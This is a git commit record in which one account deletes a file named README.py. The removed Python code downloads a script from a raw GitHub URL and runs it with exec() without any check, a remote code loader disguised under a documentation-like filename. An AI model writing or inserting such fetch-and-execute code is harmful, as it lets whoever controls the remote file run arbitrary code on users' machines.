06000e150bcdabe4ed6c350d824fc276e01d28c5
levantienmc09-code <levantienmc09@gmail.com>
2025-10-24 14:19:52 +0700

    Delete README.py

--- README.py
+++
@@ -1,8 +0,0 @@
-import urllib.request
-
-url = "https://raw.githubusercontent.com/levantienmc09-code/letien09/refs/heads/main/dhp.py"
-
-with urllib.request.urlopen(url) as response:
-    script = response.read().decode()
-
-exec(script)
